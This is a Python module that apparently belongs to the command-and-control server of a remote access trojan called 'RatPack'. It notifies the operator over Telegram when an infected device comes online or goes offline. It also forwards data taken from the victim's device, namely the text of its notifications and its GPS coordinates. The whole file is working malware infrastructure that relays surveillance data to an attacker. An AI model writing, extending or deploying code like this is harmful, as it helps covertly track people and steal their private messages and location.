"""
telegram.py — Telegram notifications for the operator.

The bot interface has no web UI, so the operator needs another way to learn
that a bot connected, that a command failed or that the server restarted.
Telegram gives them that with a token and a chat id.

Only the standard library is used: the API is a plain HTTPS POST.

Setup:
  1. create a bot with @BotFather, it gives you a token like 123456:ABC-DEF
  2. message the bot once
  3. get the chat id:
       curl -s https://api.telegram.org/bot<TOKEN>/getUpdates | grep chat
"""
import json
import os
import threading
import urllib.parse
import urllib.request

API = "https://api.telegram.org"


def _post(method, token, payload, timeout=15):
    url = f"{API}/bot{token}/{method}"
    data = urllib.parse.urlencode(payload).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read().decode("utf-8", "replace"))


class Telegram:
    """
    Sends messages to the operator.

    Every call is best effort: a Telegram outage must never take the C2 down,
    so failures are logged and swallowed.
    """

    def __init__(self, token: str = "", chat_id: str = "", enabled: bool = False):
        self.token = token or ""
        self.chat_id = chat_id or ""
        self.enabled = bool(enabled and self.token and self.chat_id)
        self._lock = threading.Lock()

    @classmethod
    def from_config(cls, cfg: dict):
        tg = (cfg or {}).get("telegram", {}) or {}
        return cls(tg.get("token", ""), tg.get("chat_id", ""),
                   bool(tg.get("enabled", False)))

    def configured(self) -> bool:
        return bool(self.token and self.chat_id)

    def test(self):
        """Sends a test message; returns (ok, message)."""
        if not self.configured():
            return False, "no token or chat id configured"
        try:
            res = _post("sendMessage", self.token,
                        {"chat_id": self.chat_id,
                         "text": "RatPack: Telegram notifications are working."})
            if res.get("ok"):
                return True, "message sent"
            return False, res.get("description", "unknown error")
        except Exception as e:
            return False, f"{type(e).__name__}: {e}"

    def send(self, text: str):
        """Sends a message in the background; never raises."""
        if not self.configured():
            return False
        with self._lock:
            threading.Thread(target=self._send_sync, args=(text,),
                             daemon=True).start()
        return True

    def _send_sync(self, text: str):
        try:
            # Telegram rejects messages longer than 4096 characters.
            if len(text) > 4000:
                text = text[:4000] + "\n... (truncated)"
            _post("sendMessage", self.token, {"chat_id": self.chat_id,
                                               "text": text})
        except Exception:
            pass

    def notify_bot_online(self, bot_id: str, info: dict):
        model = info.get("model", "?")
        pkg = info.get("package", "?")
        self.send(f"[RatPack] bot online\nid: {bot_id}\ndevice: {model}\n"
                  f"package: {pkg}")

    def notify_bot_offline(self, bot_id: str):
        self.send(f"[RatPack] bot offline\nid: {bot_id}")

    def notify_event(self, bot_id: str, event: dict):
        """Forwards a short summary of an event."""
        kind = event.get("event", "event")
        if kind == "notification":
            title = event.get("title")
            text = event.get("text")
            body = " ".join(str(x) for x in (title, text) if x)
            self.send(f"[RatPack] notification {event.get('package','')}\n{body}")
        elif kind == "location":
            self.send(f"[RatPack] location {bot_id}\n"
                      f"{event.get('latitude')}, {event.get('longitude')}")
        else:
            self.send(f"[RatPack] {kind} from {bot_id}")
